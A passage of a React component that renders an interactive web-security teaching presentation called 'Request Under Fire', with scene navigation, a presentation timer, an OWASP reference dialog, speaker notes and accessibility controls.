  }, [sceneIndex, phase, scene.type, sceneBrowserOpen]);

  return (
    <>
      <a className="skip-link" href="#presentation">Skip to presentation</a>
      <header className="topbar">
        <button className="brand" type="button" onClick={() => goTo(0)} aria-label="Go to opening">
          <span className="brand-orbit" aria-hidden="true"><i /><i /></span><span>REQUEST <em>UNDER FIRE</em></span>
        </button>
        <div className="live-clock" aria-live="polite"><span>{scene.zone.toUpperCase()}</span><strong>{scene.time === 'complete' || scene.time === 'replay' ? scene.time : `t = ${scene.time}`}</strong></div>
        <div className="top-actions">
          <div className="section-switcher" role="group" aria-label="Presentation sections">
            <button type="button" className={currentSection === 'journey' ? 'is-selected' : ''} onClick={() => goTo(0)}>Journey</button>
            <button type="button" className={currentSection === 'reflections' ? 'is-selected' : ''} onClick={() => goTo(reflectionStartIndex)}>Reflections</button>
          </div>
          <button className="timer-button" type="button" onClick={() => setTimerRunning(value => !value)} aria-label={`${timerRunning ? 'Pause' : 'Start'} presentation timer`}><span>{timerRunning ? 'LIVE' : 'PACE'}</span>{formatClock(elapsed)} <i>/ {Math.round(totalMinutes)}:00</i></button>
          <button className="lens-button" type="button" onClick={() => lensRef.current?.showModal()}>OWASP <span>REFERENCE</span></button>
          <button className="icon-button" type="button" onClick={() => setShowNotes(value => !value)} aria-label="Toggle speaker notes" aria-pressed={showNotes}>N</button>
          <button className="icon-button" type="button" onClick={() => setHighContrast(value => !value)} aria-label="Toggle high contrast" aria-pressed={highContrast}>◐</button>
        </div>
      </header>

      <main id="presentation" className="stage" ref={stageRef} tabIndex="-1">
        <AnimatePresence mode="popLayout" initial={false}>
          <motion.div className="scene-frame" key={sceneIndex}
            initial={reduceMotion || inputMode === 'keyboard' ? false : { opacity: 0, transform: `translateX(${direction * 28}px) scale(.996)` }}
            animate={{ opacity: 1, transform: 'translateX(0px) scale(1)' }}
            exit={reduceMotion || inputMode === 'keyboard' ? { opacity: 0 } : { opacity: 0, transform: `translateX(${direction * -20}px) scale(.998)` }}
            transition={{ type: 'spring', visualDuration: .34, bounce: .04 }}>
            {scene.type !== 'opening' && <h1 className="sr-only">Request Under Fire: {scene.label}</h1>}
            {scene.type === 'opening' && <Opening next={() => goTo(1)} branch={branch} setBranch={setBranch} />}
            {scene.type === 'recon' && <ReconWorkbench next={() => goTo(sceneIndex + 1)} />}
            {scene.type === 'journey' && <JourneyScene scene={scene} branch={branch} setBranch={setBranch} />}
            {scene.type === 'bridge' && <ReflectionBridge branch={branch} next={() => goTo(sceneIndex + 1)} />}
            {scene.type === 'checkpoint' && <Checkpoint scene={scene} phase={phase} setPhase={setPhase} />}
            {scene.type === 'quiz' && <FieldTest />}
            {scene.type === 'closing' && <Closing restart={() => goTo(0)} openLens={() => lensRef.current?.showModal()} />}
          </motion.div>
        </AnimatePresence>
      </main>

      <SceneBrowser open={sceneBrowserOpen} currentIndex={sceneIndex} onClose={() => setSceneBrowserOpen(false)} onSelect={goTo} />

      <nav className="deck-nav" aria-label="Presentation scenes">
        <button className="nav-arrow" type="button" onClick={() => goTo(sceneIndex - 1)} disabled={sceneIndex === 0} aria-label="Previous scene">←</button>
        <div className="nav-center">
          <button className="nav-meta" type="button" aria-expanded={sceneBrowserOpen} onClick={() => setSceneBrowserOpen(value => !value)}>
            <span>{currentSection} · {scene.label} <i>⌃ scene map</i></span><strong>{scene.minutes} MIN · {String(sceneIndex + 1).padStart(2, '0')} / {String(scenes.length).padStart(2, '0')}</strong>
          </button>
          <div className="progress-track" style={{ '--scene-count': scenes.length }} role="tablist" aria-label="Presentation scenes">
            <i className="progress-fill" style={{ transform: `scaleX(${sceneIndex / (scenes.length - 1)})` }} aria-hidden="true" />
            {scenes.map((item, index) => <button type="button" role="tab" aria-selected={sceneIndex === index} aria-label={`Scene ${index + 1}: ${item.label}`} className={index === sceneIndex ? 'is-current' : index < sceneIndex ? 'is-past' : ''} onClick={() => goTo(index)} key={`${item.label}-${index}`}><i />{sceneIndex === index && <motion.span className="progress-packet" layoutId="deck-playhead" transition={reduceMotion || inputMode === 'keyboard' ? { duration: 0 } : { type: 'spring', duration: .5, bounce: .1 }} aria-hidden="true" />}</button>)}
          </div>
          <div className="nav-hint"><span>SPACE · reveal</span><span>← → · navigate</span><span>N · notes</span></div>
        </div>
        <button className="nav-arrow" type="button" onClick={() => goTo(sceneIndex + 1)} disabled={sceneIndex === scenes.length - 1} aria-label="Next scene">→</button>
      </nav>

      {showNotes && <aside className="speaker-notes" aria-label="Speaker notes"><span>SPEAKER NOTE · {scene.minutes} MIN</span><p>{scene.note}</p></aside>}
      <div className="scene-announcer sr-only" aria-live="polite">Scene {sceneIndex + 1} of {scenes.length}: {scene.label}</div>
      <LensDialog dialogRef={lensRef} />
    </>
  );
}
